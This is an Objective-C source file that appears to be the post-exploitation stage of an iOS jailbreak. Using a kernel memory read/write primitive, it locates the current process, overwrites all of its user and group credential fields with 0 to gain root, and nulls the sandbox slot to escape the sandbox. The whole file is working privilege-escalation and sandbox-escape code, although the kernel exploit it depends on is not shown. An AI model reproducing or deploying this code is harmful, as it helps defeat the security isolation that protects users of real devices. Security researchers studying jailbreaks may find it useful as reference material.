#import <Foundation/Foundation.h>
#include "post.h"
#import "kernel_memory.h"
#import "kernel_slide.h"
#import "offsets.h"
#import "patchfinder64.h"

@implementation Post

- (uint64_t)proc_for_pid:(pid_t)pid {
    uint64_t allproc = find_allproc();
    uint64_t proc;
    int pd;
    proc = kernel_read64(allproc);
    while (proc) {
        pd = kernel_read32(proc + off_p_pid);
        if (pd == pid) {
            return proc;
        }
        proc = kernel_read64(proc);
    }
    return 0;
}

- (void)root {
    uint64_t proc = [self proc_for_pid:getpid()];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_uid, 0);
    kernel_write32(proc + off_p_ruid, 0);
    kernel_write32(proc + off_p_gid, 0);
    kernel_write32(proc + off_p_rgid, 0);
    kernel_write32(ucred + off_ucred_cr_uid, 0);
    kernel_write32(ucred + off_ucred_cr_ruid, 0);
    kernel_write32(ucred + off_ucred_cr_svuid, 0);
    kernel_write32(ucred + off_ucred_cr_ngroups, 1);
    kernel_write32(ucred + off_ucred_cr_groups, 0);
    kernel_write32(ucred + off_ucred_cr_rgid, 0);
    kernel_write32(ucred + off_ucred_cr_svgid, 0);
}

- (void)unsandbox {
    uint64_t proc = [self proc_for_pid:getpid()];
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
    kernel_read64(cr_label + off_sandbox_slot);
    kernel_write64(cr_label + off_sandbox_slot, 0);
}

- (bool)go {
    kernel_slide_init();
    uint64_t kernel_base = kernel_slide + 0xFFFFFFF007004000;
    if (!is_kernel_base(kernel_base)) {
        return false;
    }
    offsets_init();
    init_kernel(kernel_base, NULL);
    [self root];
    [self unsandbox];
    term_kernel();
    return getuid() ? false : true;
}

@end

